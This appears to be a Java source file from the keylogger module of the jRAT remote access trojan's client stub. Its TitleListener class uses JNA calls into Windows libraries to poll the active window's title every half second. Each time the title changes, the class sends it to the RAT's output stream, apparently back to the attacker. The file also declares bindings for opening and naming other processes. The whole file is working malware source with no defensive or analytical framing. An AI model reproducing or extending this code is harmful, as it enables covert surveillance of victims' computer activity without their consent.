package pro.jrat.stub.keylogger;

import com.sun.jna.Native;
import com.sun.jna.Pointer;
import com.sun.jna.platform.win32.WinDef.HWND;
import com.sun.jna.ptr.PointerByReference;

public class TitleListener implements Runnable {

	private static final int MAX_TITLE_LENGTH = 1024;
	private static final char[] BUFFER = new char[MAX_TITLE_LENGTH * 2];
	private static String latest;

	@Override
	public void run() {
		try {
			Thread.sleep(1000L);
			while (true) {
				if (Plugin.dos != null && Plugin.enabled) {
					User32DLL.GetWindowTextW(User32DLL.GetForegroundWindow(), BUFFER, MAX_TITLE_LENGTH);
					String title = Native.toString(BUFFER);
					
					if (latest == null || latest != null && !title.equals(latest)) {
						Plugin.writeChars("-c TITLE".toCharArray());
						Plugin.writeChars(("-c " + title).toCharArray());
					}
					
					latest = title;				
				}
				Thread.sleep(500L);
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	static class Psapi {
		static {
			Native.register("psapi");
		}

		public static native int GetModuleBaseNameW(Pointer hProcess, Pointer hmodule, char[] lpBaseName, int size);
	}

	static class Kernel32 {
		static {
			Native.register("kernel32");
		}
		public static int PROCESS_QUERY_INFORMATION = 0x0400;
		public static int PROCESS_VM_READ = 0x0010;

		public static native int GetLastError();

		public static native Pointer OpenProcess(int dwDesiredAccess, boolean bInheritHandle, Pointer pointer);
	}

	static class User32DLL {
		static {
			Native.register("user32");
		}

		public static native int GetWindowThreadProcessId(HWND hWnd, PointerByReference pref);

		public static native HWND GetForegroundWindow();

		public static native int GetWindowTextW(HWND hWnd, char[] lpString, int nMaxCount);
	}

}
